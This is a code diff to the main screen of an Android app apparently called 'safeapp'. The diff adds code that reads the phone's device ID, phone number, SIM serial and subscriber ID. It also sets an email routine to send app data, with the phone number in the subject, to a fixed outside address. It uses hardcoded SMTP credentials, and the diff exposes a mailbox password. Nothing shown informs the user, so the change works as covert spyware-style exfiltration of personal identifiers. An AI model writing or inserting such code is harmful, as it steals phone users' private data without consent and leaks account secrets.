@@ -1,7 +1,9 @@
 package cn.net.darking.safeapp;
 
+import android.content.Context;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.ImageView;
@@ -52,12 +54,19 @@ public class MainActivity extends AppCompatActivity {
     @BindView(R2.id.main_tv_mine)
     TextView tv_mine;
 
-
+    TelephonyManager tm;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         ButterKnife.bind(this);
+
+        //获取手机号码
+        tm = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
+        String deviceid = tm.getDeviceId();//获取智能设备唯一编号
+        String te1  = tm.getLine1Number();//获取本机号码
+        String imei = tm.getSimSerialNumber();//获得SIM卡的序号
+        String imsi = tm.getSubscriberId();//得到用户Id
 
         onClick(ll_safe);
     }
@@ -124,15 +133,15 @@ public class MainActivity extends AppCompatActivity {
             public void run() {
                 try {
                     MailSenderInfo mailInfo = new MailSenderInfo();
-                    mailInfo.setMailServerHost("smtp.163.com");
+                    mailInfo.setMailServerHost("smtp.sina.com");
                     mailInfo.setMailServerPort("25");
                     mailInfo.setValidate(true);
-                    mailInfo.setUserName("fsdz10086@163.com"); // 你的邮箱地址
+                    mailInfo.setUserName("fsdz10086@sina.com"); // 你的邮箱地址
 //					mailInfo.setPassword("guolugui521");// 您的邮箱密码
                     mailInfo.setPassword("fsdz10086");// 这里用的是客户端授权码
-                    mailInfo.setFromAddress("fsdz10086@163.com"); // 发送的邮箱
+                    mailInfo.setFromAddress("fsdz10086@sina.com"); // 发送的邮箱
                     mailInfo.setToAddress("jsdz10086@163.com"); // 发到哪个邮件去
-                    mailInfo.setSubject("测试发送"); // 邮件主题
+                    mailInfo.setSubject("主题" + tm.getLine1Number());//获取本机号码 ); // 邮件主题
                     mailInfo.setContent(info); // 邮件文本
                     // 这个类主要来发送邮件
                     MailSender sms = new MailSender();
